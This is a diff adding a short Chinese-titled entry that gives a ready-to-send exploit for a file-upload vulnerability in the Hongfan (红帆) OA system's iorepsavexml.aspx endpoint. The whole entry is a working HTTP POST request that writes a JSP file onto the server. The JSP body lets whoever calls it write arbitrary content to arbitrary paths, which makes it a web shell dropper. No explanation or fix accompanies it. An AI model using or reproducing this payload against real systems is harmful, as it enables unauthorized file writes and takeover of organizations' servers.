@@ -1,0 +1,10 @@
+# 红帆OA iorepsavexml接口文件上传漏洞
+POST /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=qaxnb.jsp&filepath=/upfiles/rep/pic/ HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://tempuri.org/GetDocStep"
+Content-Length: 175
+
+<%
+if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+%>
